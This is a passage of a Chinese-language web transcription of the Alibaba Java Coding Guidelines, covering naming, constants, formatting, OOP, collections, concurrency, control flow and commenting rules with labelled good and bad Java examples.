CacheServiceImpl 实现 CacheService 接口。    2. 【推荐】 如果是形容能力的接口名称，取对应的形容词做接口名称（通常是 -able 的形式）。    正例： AbstractTranslator 实现 Translatable。14. 【参考】 枚举类名建议带上 Enum 后缀，枚举成员名称需要全大写，单词用下划线隔开。说明： 枚举其实就是特殊的常量类，且构造方法被默认强制是私有。正例： 枚举名字： DealStatusEnum， 成员名称：SUCCCESS / UNKNOW_REASON。15. 【参考】 各层命名规约：    1. Service/DAO 层方法命名规约        1. 获取单个对象的方法用 get 做前缀。        2. 获取多个对象的方法用 list 做前缀。        3. 获取统计值的方法用 count 做前缀。        4. 插入的方法用 save（推荐）或 insert 做前缀。        5. 删除的方法用 remove（推荐）或 delete 做前缀。        6. 修改的方法用 update 做前缀。    2. 领域模型命名规约        1. 数据对象： xxxxDO，xxx 即为数据表名。        2. 数据传输对象： xxxDTO，xxx 为业务领域相关的名称。        3. 展示对象： xxxVO，xxx 一般为网页名称。        4. POJO 是 DO/DTO/BO/VO 的统称，禁止命名成 xxxPOJO。<br>### （二）常量定义1. 【强制】 不允许任何魔法值（即未经定义的常量）直接出现在代码中。反例：<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">String key = "Id#taobao_" + tradeId;cache.put(key, value);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>2. 【强制】 long 或者 Long 初始赋值时，必须使用大写的 L，不能使小写的 l，小写容易跟数字 1 混淆，造成误解。说明： `Long a = 2l;` 写的是数字的 21，还是 Long 型的 2？3. 【推荐】 不要使用一个常量类维护所有的常量，应该按照常量功能进行归类，分开维护。如：缓存相关的常量放在类 CacheConsts 下；系统配置相关的常量放在类 ConfigConsts 下。说明： 大而全的常量类，非得使用查找功能才能定位到修改的常量，不利于理解和维护。4. 【推荐】 常量的复用层次有五层：跨应用共享常量、应用内共享常量、子工程内共享常量、包内共享常量和类内共享常量。    1. 跨应用共享常量：放置在二房库中，通常是 clien.jar 中的 constant 目录下。    2. 应用内共享常量：放置在一方库的 modules 中的 constant 目录下。    反例：易懂变量也要统一定义成应用内共享常量，两位攻城狮在两个类中分别定义了表示“是”的常量：        类 A 中：`public static final String YES = "yes";        类 B 中：`public static final String YES = "y";        `A.YES.equals(B.YES)`，预期是 true，但实际返回 false，导致线上问题。    3. 子工程内部共享常量：即在当前子工程的 constant 目录下。    4. 包内共享常量：即在当前包下单独的 constant 目录下。    5. 类内共享常量：直接在类内部 `private static final` 定义。5. 【推荐】 如果变量值仅在一个范围内变化，且带有名称之外的延伸属性，定义为枚举类。下面正例中的数字就是延伸信息，表示星期几。正例： `public Enum {MONDAY(1), TUESDAY(2), WEDNESDAY(3), THURSDAY(4), FRIDAY(5), SATURDAY(6), SUNDAY(7);}`<br>### （三）代码格式1. 【强制】 大括号的使用约定。如果是大括号内为空，则简洁地写成{}即可，不需要换行；如果是非空代码块则：    1. 左大括号前不换行。    2. 左大括号后换行。    3. 右大括号前换行。    4. 右大括号后还有 else 等代码则不换行；表示终止的右大括号后必须换行。2. 【强制】 左小括号和字符之间不出现控制；同样，右小括号和字符之间也不出现空格。详见第 5 条下方正例提示。反例： if (<font style="background-color: #cccccc;">空格</font>a == b<font style="background-color: #cccccc;">空格</font>)3. 【强制】 if/for/while/switch/do 等保留字与括号之间都必须加空格。4. 【强制】 任何二目、三目运算符的左右两边都需要加一个空格。说明： 运算符包括赋值运算符 =、逻辑运算符 &amp;&amp;、加减乘除符号等。5. 【强制】 缩进采用 4 个空格，禁止使用 tab 字符。说明：如果使用 tab 缩进，必须设置 1 个 tab 为 4 个空格。IDEA 设置 tab 为 4 个空格时，请勿勾选 红色开始 Use tab character 红色结束；而在 eclipse 中，必须勾选 红色开始 insert spaces for tabs 红色结束。正例： （涉及 1-5 点）<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public static void main(String[] args) {// 缩进 4 个空格String say = "hello";// 运算符的左右必须有一个空格int flag = 0;// 关键期 if 与括号之间必须有一个空格，括号内的 f 与左括号，0 与右括号不需要空格if (flag == 0) {System.out.println(say);}// 左大括号前加空格且不换行；左大括号后换行if (flag == 1) {System.out.pringln("world");// 右大括号钱换行，右大括号后有 else，不用换行} else {System.out.println("ok");// 在右大括号后直接结束，则必须换行}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>6. 【强制】 单行字符数限制不超过 120 个，超出需要换行，换行时遵循如下原则：    1. 第二行相对第一行缩进 4 个空格，从第三行开始，不再继续缩进，参考示例。    2. 运算符与下文一起换行。    3. 方法调用的点符号与下文一起换行。    4. 在多个参数超长，在逗号后换行。    5. 在括号钱不要换行，见反例。正例：<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">StringBuffer sb = new StringBuff();sb.append("zi").append("xin")....append("huang")....append("huang")....append("huang");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>反例：<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">StringBuffer sb = new StringBuffer();// 超过 120 个字符的情况下，不要在 括号前 换行sb.append("zi").append("xin")...append("huang");// 参数很多的方法调用可能超过 120 个字符，不要在 逗号前 换行method(args1, args2, args3, ..., argsX);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>7. 【强制】 方法参数在定义和传入时，多个参数逗号后边必须加空格。正例： 下例中实参的 蓝色开始 "a", 蓝色结束后边必须要有一个空格。<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">method("a", "b", "c");<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>8. 【强制】 IDE 的 text file encoding 设置为 UTF-8；IDE 中文件的换行符使用 Unix 格式，不要使用 windows 格式。9. 【推荐】 没有必要增加若干空格来使某一行的字符与上一行对应位置的字符对齐。正例：<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">int a = 3;long b = 4L;float c = 5F;StringBuffer sb = new StringBuffer();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>说明： 增加 sb 这个变量，如果需要对齐，则给 a、b、c 都要增加几个空格，在变量比较多的情况下，是一种累赘的事情。10. 【推荐】 方法体内的执行语句组、变量的定义语句组、不同的业务逻辑之间或者不同的语义之间插入一个空行。相同业务逻辑和语义之间不需要插入空行。说明： 没有必要插入蓝色开始多个空行蓝色结束进行隔开。<br>### （四）OOP 规约1. 【强制】 避免通过一个类的对象引用访问此类的静态变量或静态方法，武威增加编译器解析成本，直接用蓝色开始类名蓝色结束来访问即可。2. 【强制】 所有的覆写方法，必须加 @Override 注解。说明： getObject() 与 get0bject() 的问题。一个是字母的 O，一个是数字的 0，加 @Override 可以准确判断是否覆盖成功。另外，如果在抽象类中对方法签名进行修改，其实现类会马上编译报错。3. 【强制】 相同参数类型，相同业务寒意，才可以使用 Java 的可变参数，避免使用 Objcet。说明： 可变参数必须放置在参数列表的最后。（提倡同学们尽量不用可变参数编程）正例：<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public User getUser(String type, Integer... ids) {...}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>4. 【强制】 外部正在调用或者二房库依赖的接口，不允许修改方法签名，避免对接口调用产生影响。接口过时必须加 @Deprecated 注解，并清晰的说明采用的新接口或者新服务是什么。5. 【强制】 不能使用过时的类或方法。说明： java.net.URLDecoder 中的方法 decode(String encodeStr) 这个方法已经过时，应该使用参数 decode(String source, String encode)。接口提供方既然明确是过时接口，name 有义务同时提供新的接口；作为调用方来说，有义务去考证过时方法的新实现是什么。6. 【强制】 Object 的 equals 方法容易抛空指针异常，应使用常量或者确定有值得对象来调用 equals。正例： `"test".equals(object);`反例： `object.equals("test");`说明： 推荐使用 java.util.Objects#equals （JDK 7 引入的工具类）7. 【强制】 所有的相同类型的包装类对象之间蓝色开始值得比较蓝色结束，全部使用 equals 方法比较。说明： 对于 `Integer var = ?` 在 蓝色开始-128 至 127 蓝色结束 范围内的赋值，Integer 对象是在 IntegerCache.cache 产生，会复用已有对象，这个区间内的 Integer 值可以直接使用 == 进行判断，但是这个区间之外的所有数据，都会在堆上产生，并不会复用已有对象，这事一个大坑，推荐使用 equals 方法进行判断。8. 关于基本数据类型与包装数据类型的使用标准如下：    1 【强制】 所有的 POJO 类属性必须使用包装数据类型。    2 【强制】 RPC 方法的返回值和参数必须使用包装数据类型。    3 【推荐】 所有的局部变量使用基本数据类型。说明： POJO 类属性没有初始值是提醒使用者在需要使用时，必须自己显示的进行赋值，任何 NPE 问题，或者入库检查，都由使用者来保证。正例： 数据库的差 U 型那结果可能是 null，因为自动拆箱，用基本数据类型接收有 NPE 风险。反例： 比如显示成交总额涨跌情况，即正负 x%，x 为基本数据类型，调用的 RPC 服务，调用不成功时，返回的是默认值，页面显示：0%，这是不合理的，应该显示成中划线 -。所以包装数据类型的 null 值，能够表示额外的信息，如：远程调用失败、异常退出等。9. 【强制】 定义 DO/DTO/VO 等 POJO 类时，不要设定任何属性蓝色开始默认值蓝色结束。反例： POJO 类的 gmtCreate 默认值为 `new Date();`，但是这个属性在数据提取时并没有置入具体值，在更新其它字段时又附带更新了此字段，导致创建时间被修改成当前时间。10. 【强制】 序列化类新增属性时，请不要修改 serialVersionUID 字段，避免反序列失败；如果完全不兼容升级，避免反序列化混乱，那么请修改 serialVersionUID 值。11. 【强制】 构造方法里面禁止加入任何业务逻辑，如果有初始化逻辑，请放在 init 方法中。12. 【强制】 POJO 类必须写 toString 方法。使用 IDE 中的工具：source &gt; generate toString 时，如果继承了另一个 POJO 类，注意在前面加一下 super.toString。13. 【推荐】 使用索引访问用 String 的 split 方法得到的数组时，需做最后一个分隔符后有无内容的检查，否则会有抛 IndexOutOfBoundsException 的风险。说明：<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">String str = "a,b,c,,";String[] ary = str.split(",");// 预期大于 3，结果是 3System.out.println(ary.length);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>14. 【推荐】 当一个类有多个构造方法，或者多个同名方法，这些方法应该按照顺序放置在一起，便于阅读。15. 【推荐】 类内方法定义顺序依次是：公有方法或保护方法 &gt; 私有方法 &gt; getter/setter 方法说明： 共有方法时类的调用者和维护者最关心的方法，首屏展示最好；保护方法虽然只是子类关心，也可能是“模板设计模式”下的核心方法；而私有方法外部一般不需要特别关心，是一个黑盒实现；因为方法信息价值较低，所有 Service 和 DAO 的 getter/setter 方法放在类提最后。16. 【推荐】 setter 方法中，参数名称与类成员变量名称一致，`this.成员名 = 参数名`。在 getter/setter 方法中，不要增加业务逻辑，增加排查问题的难度。反例：<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public Integer getData() {if (true) {return this.data + 100;} else {return this.data - 100;}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>17. 【推荐】 循环体内，字符串的连接方式，使用 StringBuilder 的 append 方法进行扩展。说明： 反编译出的字节码文件显示每次循环都会 new 出一个 StringBuilder 对象，然后进行 append 操作，最后通过 toString 方法返回 String 对象，造成内存资源浪费。反例：<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">String str = "start";for (int i = 0; i &lt; 100; i++) {str = str + "hello";}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>18. 【推荐】 final 可以声明类、成员变量、方法、以及本地变量，下列情况使用 final 关键字：    1. 不允许被继承的类，如：String 类。    2. 不允许修改引用的域对象，如：POJO 类的域变量。    3. 不允许被重写的方法，如：POJO 类的 setter 方法。    4. 不允许运行过程中重新赋值的局部变量。    5. 避免上下文重复使用一个变量，使用 final 描述可以强制重新定义一个变量，方便更好地进行重构。19. 【推荐】 慎用 Object 的 clone 方法来拷贝对象。说明： 对象的 clone 方法默认是浅拷贝，若想实现深拷贝需要重写 clone 方法实现属性对象的拷贝。20. 【推荐】 类成员与方法访问控制从严：    1. 如果不允许外部有直接通过 new 来创建对象，那么构造方法必须是 private。    2. 工具类不允许有 public 或 default 构造方法。    3. 类非 static 成员变量并且与子类共存，必须是 protected。    4. 类非 static 成员变量并且仅在本类使用，必须是 private。    5. 类 static 成员变量如果仅在本类使用，必须是 private。    6. 若是 static 成员变量，必须考虑是否为 final。    7. 类成员方法只供内部调用，必须是 private。    8. 类成员方法只对继承类公开，那么限制为 protected。说明： 任何类、方法、参数、变量，严控访问范围。过于宽泛的访问范围，不利于模块解耦。思考： 如果是一个 private 的方法，想删除就删除，可是一个 public 的 service 方法，或者一个 public 的成员变量，删除一下，不得手心冒点汗吗？变量像自己的小孩，尽量在自己的视线内，变量作用域太大，如果无限制的到处跑，那么你会担心的。<br>### （五）集合处理1. 【强制】 关羽 hashCode 和 equals 的处理，遵循如下规则：    1. 只要重写 equals，就必须重写 hashCode。    2. 因为 Set 存储的是不重复的对象，依据 hashCode 和 equals 进行判断，所以 Set 存储的对象必须重写这两个方法。    3. 如果自定义对象违 Map 的键，那么必须重写 hashCode 和 equals。说明： String 重写了 hashCode 和 equals 方法，所以我们可以非常愉快地使用 String 对象作为 key 来使用。2. 【强制】 ArrayList 的 subList 结果不可强转成 ArrayList，否则会抛出 ClasscastException 异常：java.util.RandomAccessSubList cannot be cast to java.util.ArrayList；说明： subList 返回的是 ArrayList 的内部类 SubList，并不是 ArrayList，而是 ArrayList 的一个视图，对于 SubList 子列表的所有操作最终会反映到原列表上。3. 【强制】 在 subList 场景中，蓝色开始高度注意蓝色结束对原集合元素个数的修改，会导致子列表的遍历、增加、删除均产生 ConcurrentModificationException 异常。4. 【强制】 使用几何转数组的方法，必须使用几何的 toArray(T[] array)，传入的是类型完全一样的数组，大小就是 list.size()。说明： 使用 toArray 带参方法，入参分配的数组空间不够大时，toArray 方法内部将重新分配内存空间，并返回新数组地址；如果数组元素大于实际所需，下标为 [ list.size() ] 的数组元素将被置为 null，其他数组元素保持原值，因此最好将方法入参，数组大小定义与几何元素个数一致。正例：<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">List&lt;String&gt; list = new ArrayList&lt;String&gt;(2);list.add("guan");list.add("bao");String[] array = new String[list.size()];array = list.toArray(array);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>反例： 直接使用 toArray 无参方法存在问题，此方法返回值只能是 Object[] 类，若强转其它类型数组将出现 ClassCastException 错误。5. 【强制】 实用工具类 Arrays.asList() 把数组转换成集合时，不能使用其修改集合相关的方法，它的 add/remove/clear 方法会抛出 UnsupportedOperationException 异常。说明： asList 的返回对象是一个 Arrays 内部类，并没有实现集合的修改方法。Arrays.asList 体现的是适配器模式，只是转换接口，后台的数据仍是数组。<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">String[] str = new String[] {"a", "b"};List list = Arrays.asList(str);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>第一种情况： `list.add("c");` 运行时异常。第二种情况： `str[0] = "gujin";` 那么 list.get(0) 也会随之修改。6. 【强制】 泛型通配符 <!--? extends T--> 来接收返回的数据，此写法的泛型集合不能使用 add 方法，而 <!--? super T--> 不能使用 get 方法，作为接口调用赋值时易出错。说明： 扩展说一下 PECS（Producer Extends Consumer Super）原则：    1. 频繁往外读取内容的，适合用上界 Extends。    2. 经常往里插入的，适合用下界 Super。7. 【强制】 不要在 foreach 循环里进行元素的 remove/add 操作。remove 元素请使用 Iterator 方式。如果并发操作，需要对 Iterator 对象加锁。正例：<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">Iteratior&lt;String&gt; it = a.iterator();while (it.hasNext()) {String temp = it.next();if (删除元素的条件) {it.remove();}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>反例：<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">List&lt;String&gt; a = new ArrayList&lt;String&gt;();a.add("1");a.add("2");for (String temp : a) {if ("1".equals(temp)) {a.remove(temp);}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>说明： 以上代码的执行结果肯定会出乎大家的意料，那么试一下把“1”换成“2”，回事同样的结果吗？8. 【强制】 在 JDK 7 版本及以上，Comparator 要满足如下三个条件，不然 Arrays.sort、Collections.sort 会报 IllegalArgumentException 异常。说明：    1. x、y 的比较结果和 y、x 的比较结果相反。    2. x &gt; y，y &gt; z，则 x &gt; z。    3. x = y，则 x、z 的比较结果和 y、z 的比较结果相同。反例： 下例中没有处理相等的情况，实际使用中可能会出现异常：<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">new Comparator&lt;Student&gt;() {@Overridepublic int compare(Student o1, Student o2) {return o1.getId() &gt; o2.getId() ? 1 : -1;}};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>9. 【推荐】 集合初始化时，指定集合初始值大小。说明： HashMap 使用 HashMap(int initialCapacity) 初始化。正例： initialCapacity = (蓝色开始需要存储的元素个数 / 负载因子) + 1 蓝色结束。注意蓝色开始负载因子（即 loader factor）蓝色结束默认为 0.75，如果暂时无法确定初始值大小，请设置为 16.反例： HashMap 需要放置 1024 个元素，由于没有设置容量初始大小，随着元素不断增加，容量 7 次被迫扩大，resize 需要重建 hash 表，严重影响性能。10. 【推荐】 使用 entrySet 遍历 Map 类集合 KV，而不是 keySet 方式进行遍历。说明： keySet 其实是遍历了 2 次，一次是转为 Iterator 对象，另一次是从 hashMap 中去除 key 所对应的 value。而 entrySet 只是遍历了一次就把 key 和 value 都放到了 entry 中，效率更高。如果是 JDK 8，使用 Map.foreach 方法。正例： values() 返回的是 V 值集合，是一个 list 集合对象；keySet() 返回的是 K 值集合，是一个 Set 集合对象；entrySet() 返回的是 K-V 值组合集合。11. 【推荐】 高度注意 Map 类集合 K/V 能不能存储 null 值的情况，如下表格：|**集合类**|**Key**|**Value**|**Super**|**说明**||:---:|:---:|:---:|:---:|:---:||Hashtable|橙色开始不允许为 null 橙色结束|橙色开始不允许为 null 橙色结束|Dictionary|线程安全||ConcurrentHashMap|橙色开始不允许为 null 橙色结束|橙色开始不允许为 null 橙色结束|AbstractMap|分段锁技术||TreeMap|红色开始不允许为 null 红色结束|蓝色开始允许为 null 蓝色结束|AbstractMap|线程不安全||HashMap|蓝色开始允许为 null 蓝色结束|蓝色开始允许为 null 蓝色结束|AbstractMap|线程不安全|反例： 由于 HashMap 的安饶，很多人认为 ConcurrentHashMap 是可以置入 null 值，而事实上，存储 null 值时会抛出 NPE 异常。12. 【参考】 合理利用好集合的有序性（sort）和稳定性（order），避免集合的无序性（unsort）和不稳定性（unorder）带来的负面影响。说明： 有序性是指遍历的结果是按某种比较规则一次排列的。稳定性指集合每次遍历的元素次序是一定的。如：ArrayList 是 order/unsort；HashMap 是 unorder/unsort；TreeSet 是 order/sort。14. 【参考】 利用 Set 元素唯一的特性，可以快速对一个集合进行去重操作，避免使用 List 的 contains 方法进行遍历、对比、去重操作。<br>### （六）并发处理1. 【强制】 获取单例对象需要保证线程安全，其中的方法也要保证线程安全。说明：资源驱动类、工具类、单例工厂类都需要注意。2. 【强制】 创建线程或线程池时请指定有意义的线程名称，方便出错时回溯。正例：<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public class TimerTaskThread extends Thread {public TimerTaskThread() {super.setName("TimerTaskThread";...}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>3. 【强制】 线程资源必须通过线程池提供，不允许在应用中自行显示创建线程。说明： 使用线程池的好处是减少在创建和销毁线程上所花的时间以及系统资源的开销，解决资源不足的问题。如果不使用线程池，有可能造成系统创建大量同类线程而导致消耗完内存或“过度切换”的问题。4. 【强制】 线程池不允许使用 Executors 去创建，而是通过 ThreadPoolExecutor 的方式，这样的处理方式让写的同学更加明确线程池的运行规则，规避资源耗尽的风险。说明： Executors 返回的线程池对象的弊端如下：    1. 红色开始 FixedThreadPool 红色结束 和 红色开始 SingleThreadPool 红色结束：允许的请求队列长度为 Integer.MAX_VALUE，可能会堆积大量的请求，从而导致 OOM。    2. 红色开始 CachedThreadPool 红色结束 和 红色开始 ScheduledThreadPool 红色结束：允许的创建线程数量为 Integer.MAX_VALUE，可能会创建大量的线程，从而导致 OOM。5. 【强制】 SimpleDateFormat 是线程不安全的类，一般不要定义为 static 变量，如果定义为 static，必须加锁，或者使用 DateUtils 工具类。正例： 注意线程安全，使用 DateUtils。亦推荐如下处理：<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">private static final ThreadLocal&lt;DateFormat&gt; df = new ThreadLocal&lt;DateFormat&gt;() {@Overrideprotected DateFormat initialValue() {return new SimpleDateFormat("yyyy-MM-dd");}};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>说明： 如果是 JDK 8 的应用，可以使用 Instant 代替 Date，LocalDateTime 代替 Calendar，DateTimeFormatter 代替 Simpledateformatter，官方给出的解释：simple beautiful strong immutable thread-safe。6. 【强制】 高并发时，同步调用应用应该去考量锁的性能损耗。能用无锁数据结构，就不要用锁；能锁区块，就不要锁整个方法体；能用对象锁，就不要用类锁。说明： 尽可能使加锁的代码块工作量尽可能的小，避免在锁代码块中调用 RPC 方法。7. 【强制】 对多个资源、数据库表、对象同时加锁时，需要保持一致的加锁顺序，否则可能造成死锁。说明： 线程一需要对表 A、B、C 依次全部加锁后才可以进行更新操作，那么线程二的加锁顺序也必须是 A、B、C，否则可能出现死锁。8. 【强制】 并发修改同一记录时，避免更新丢失，需要加锁。要么在应用层加锁，要么在缓存加锁，要么在数据层使用乐观锁，使用 version 作为更新依据。说明： 如果每次访问冲突概率小于 20%，推荐使用乐观锁，否则使用悲观锁。乐观锁的重试次数不得小于 3 次。9. 【强制】 多线程并行处理定时任务时，Timer 运行多个 TimeTask 时，只要其中之一没有捕获抛出的异常，其他任务便会自动终止运行，使用 ScheduledExecutorService 则没有这个问题。10. 【推荐】 使用 CountDownLatch 进行异步转同步操作，每个线程退出前必须调用 countDown 方法，线程执行代码注意 catch 异常，确保 countDown 方法可以执行，避免主线程无法执行至 await 方法，知道超时才返回结果。说明： 注意，子线程抛出异常堆栈，不能在主线程 try-catch 到。11. 【推荐】 避免 Random 实例被多线程使用，虽然共享该实例是线程安全的，但会因竞争同一 seed 导致性能下降。说明： Random 实例包括 java.util.Random 的实例或者 Math.random() 的方式。正例： 在 JDK 7 之后，可以直接使用 API ThreadLocalRandom，而在 JDK 7 之前，需要编码保证每个线程持有一个实例。12. 【推荐】 在并发场景下，通过双重检查锁（double-checked locking）实现延迟初始化的优化问题隐患（可参考 The "Double-Checked Locking is Broken" Declaration），推荐问题解决方案中较为简单的一种（适用于 JDK 5 及以上版本），将目标属性声明为 volatitle 型。反例： <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">class Foo {private Helper helper = null;public Helper getHelper() {if (helper == null) synchronized(this) {if (helper == null)helper = new Helper();}return helper;}// other functions and members...}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>13. 【参考】 volatile 解决多线程内存不可见问题。对于一写多读，是可以解决变量同步问题，但是如果多写，同样无法解决线程安全问题。如果是 count++ 操作，使用如下类实现：<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">AtomicInteger count = new AtomicInteger();count.addAndGet(1);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>如果是 JDK 8，推荐使用 LongAdder 对象，比 AtomicLong 性能更好（减少乐观锁的重试次数）。14. 【参考】 HashMap 在容量不够进行 resize 时由于高并发可能出现死链，导致 CPU 飙升，在开发过程中可以使用其他数据结构或加锁来规避此风险。15. 【参考】 ThreadLocal 无法解决共享对象的更新问题，ThreadLocal 对象建议使用 static 修饰。这个变量时针对一个县城内所有操作共有的，所以设置为静态变量，所有此类实例共享此惊天变量，也就是说在类第一次被使用是装载，只分配一块存储空间，所有此类的对象（只要是这个线程内定义的）都可以操控这个变量。<br>### （七）控制语句1. 【强制】 在一个 switch 块内，每个 case 要么通过 break/return 等来终止，要么注释说明程序将继续执行到哪个 case 位置；在一个 switch 块内，都必须包含一个 default 语句并且放在最后，即使它什么代码也没有。2. 【强制】 在 if/else/for/while/do 语句中必须使用大括号。即使只有一行代码，避免使用单行形式：`if (condition) statements;`3. 【推荐】 表达异常的分支时，少用 if-else 方式，这种方式可以改写成：<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">if (condition) {...return obj;}// 接着写 else 的业务逻辑代码；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>说明： 如果非得使用 if ()...else if ()...else... 方式表达逻辑，【强制】 避免后续代码维护困难，请勿超过三层。正例： 逻辑上超过 3 层的 if-else 代码可以使用卫语句，或者状态模式来实现。卫语句示例如下：<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">today</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isBusy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"change time."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isFree</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"go to travel."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"stay at home to learn Alibaba Java Coding Guideline."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>4. 【推荐】 除常用方法（如 getXxx/isXxx）等外，不要在条件判断中执行其他复杂的语句，将复杂逻辑判断的结果赋值给一个有意义的布尔变量名，以提高可读性。说明： 很多 if 语句内的逻辑相当复杂，阅读者需要分析条件表达式的最终结果，才能明确什么样的条件执行什么样的语句，name，如果阅读者分析逻辑表达式错误呢？正例： <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">// 伪代码如下final boolean existed = (file.open(fileName, "w") != null) &amp;&amp; (...) || (...);if (existed) {...}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>反例：<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">if ((file.open(fileName, "w") != null) &amp;&amp; (...) || (...)) {...}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>5. 【推荐】 循环体重的语句要考量性能，一下操作尽量移植至循环体外处理，如定义对象、变量、获取数据库连接，进行不必要的 try-catch 操作（这个 try-catch 是否可以移至循环体外）。6. 【推荐】 接口入参保护，这种场景常见的是用于做批量操作的接口。7. 【参考】 下列情形，需要进行参数校验：    1. 调用频次低的方法。    2. 执行时间开销很大的方法。此情形中，参数校验时间几乎可以忽略不计，但如果因为参数错误导致中间执行回退，或者错误，那得不偿失。    3. 需要极高稳定性和可用性的方法。    4. 对外提供的开放接口，不管是 RPC/API/HTTP 接口。    5. 敏感权限接口。8. 【参考】 下列情形，不需要进行参数校验：    1. 极有可能被循环调用的方法。但在方法说明里必须注明外部参数检查要求。    2. 底层调用频度比较高的方法。毕竟是想纯净水过滤的最后一道，参数错误不太可能到底层才会暴露问题。一般 DAO 层与 Service 层都在同一个应用中，步数在同一台服务器中，所以 DAO 的参数校验，可以省略。    3. 被声明成 private 只会被自己代码所调用的方法，如果能够确定调用方法的代码传入参数已经做过检查或者肯定不会有问题，此时可以不校验参数。<br>### （八）注释规约1. 【强制】 类、类属性、类方法的注释必须使用 Javadoc 规范，使用 `/** 内容 */` 格式，不得使用 //xxx 方式。说明： 在 IDE 编辑窗口中，Javadoc 方式会提示相关注释，生成 Javadoc 可以正确输出响应注释；在 IDE 中，工程调用方法时，不进入方法即可悬浮提示方法、参数、返回值得意义，提高阅读效率。2. 【强制】 所有的抽象方法（包括接口中的方法）必须要用 Javadoc 注释，除了返回值、参数、异常说明外，还必须指出该方法做什么事情，实现什么功能。说明： 对子类的实现要求，或者调用注意事项，请一并说明。3. 【强制】 所有的类都必须添加创建者和创建日期。4. 【强制】 方法内部单行注释，在被注释语句上方另起一行，使用 `//` 注释。方法内部多行注释使用 `/* */` 注释，注意与代码对齐。5. 【强制】 所有的枚举类型字段必须要有注释，说明每个数据项的用途。6. 【推荐】 与其“半吊子”英文来注释，不如用中文注释把问题说清楚。专有名词与关键字保持英文原文即可。反例： “TCP 连接超时”解释成“传输控制谢意连接超时”，理解反而费脑筋。7. 【推荐】 代码修改的同时，注释也要进行相应的修改，尤其是参数、返回值、异常、核心逻辑等的修改。说明： 